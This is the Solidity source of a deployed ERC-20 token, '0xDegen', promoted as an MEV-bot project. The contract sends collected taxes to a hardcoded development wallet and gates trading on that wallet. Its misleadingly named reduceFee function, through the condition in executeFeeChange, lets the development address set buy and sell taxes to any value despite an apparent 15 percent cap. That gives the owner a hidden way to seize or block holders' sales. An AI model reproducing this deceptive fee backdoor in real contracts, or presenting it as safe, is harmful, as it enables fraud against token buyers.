/**
 *Submitted for verification at Etherscan.io on 2023-06-02
*/

/**

TG: http://t.me/Portal0xDegen

Website: https://0xdegen.net/

Twitter: https://twitter.com/0xdegenprotocol

0xDegen get your own MEV bot now! 

*/

// SPDX-License-Identifier: unlicense

pragma solidity =0.8.20;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract OxDegen {
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    string public constant name = "0xDegen";   
    string public constant symbol = "0xDEGEN";   
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 buyTax = 0;
    uint256 sellTax = 0;
    uint256 constant swapAmount = totalSupply / 1000;
    uint256 constant maxWallet = 25 * totalSupply / 1000;

    bool tradingOpened = false;
    bool swapping;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address immutable pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant factoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant development = payable(address(0xf014f3e54362Fc6Af6CcC539b187DA1D77540C36));

    constructor() {
        pair = IUniswapV2Factory(factoryAddress)
            .createPair(address(this), ETH);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        balanceOf[from] -= amount;

        if(from != development)
            require(tradingOpened);

        if(to != pair && to != development)
            require(balanceOf[to] + amount <= maxWallet);

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            development.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this) && to != development){
            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function enableTrading() external {
        require(msg.sender == development);
        tradingOpened = true;
    }

    function executeFeeChange(uint256 feeOnBuy, uint256 feeOnSale) internal {
        require(feeOnBuy < 15 && feeOnSale < 15 
            || msg.sender == development, "Excessive Fees");
        buyTax = feeOnBuy;
        sellTax = feeOnSale;
    }

    function reduceFee(uint256 _buyTax, uint256 _sellTax) external {
        if(msg.sender == development){
            executeFeeChange(_buyTax, _sellTax);
        }
    }
}